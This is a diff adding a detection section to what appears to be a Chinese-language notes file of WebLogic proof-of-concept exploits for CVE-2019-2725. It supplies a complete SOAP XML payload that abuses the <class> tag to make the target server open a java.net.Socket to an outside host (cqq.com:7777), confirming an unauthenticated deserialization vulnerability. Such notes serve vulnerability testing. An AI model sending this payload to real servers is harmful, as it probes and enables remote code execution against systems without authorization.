@@ -231,6 +231,19 @@ poc（加载自定义类）:
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
+### CVE-2019-2725_detection
+对于其检测，由于可以使用class标签，这里构造一个`java.net.Socket`类即可通过探测端口来判断CVE-2019-2725的可利用性（至少说明可以使用`<class>`标签）。
+注意：`<class><string>`和`</string>`之间不要有换行或者空格。
+参考：
+- https://medium.com/@knownsec404team/weblogic-rce-cve-2019-2725-debug-diary-bb5b3b8b9e6
+```
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+<java><class><string>java.net.Socket</string><void><string>cqq.com</string><int>7777</int></void></class></java>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
+```
+
 
 参考：
 - [Weblogic-CVE-2019-2725分析通杀poc](https://p0rz9.github.io/2019/05/22/Weblogic-CVE-2019-2725%E5%88%86%E6%9E%90%E9%80%9A%E6%9D%80poc/)
